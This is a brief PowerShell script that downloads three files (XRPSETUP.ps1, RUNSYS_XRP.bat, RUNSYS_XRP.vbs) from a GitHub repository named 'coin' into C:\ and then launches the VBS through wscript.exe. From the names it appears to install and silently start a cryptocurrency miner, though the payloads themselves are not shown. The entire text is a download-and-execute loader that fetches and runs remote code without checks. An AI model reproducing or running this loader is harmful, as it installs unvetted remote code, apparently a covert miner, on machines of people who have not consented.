Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.bat' -OutFile 'C:\RUNSYS_XRP.bat'
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.vbs' -OutFile 'C:\RUNSYS_XRP.vbs'
Start-Process -FilePath 'wscript.exe' -ArgumentList 'C:\RUNSYS_XRP.vbs'
exit
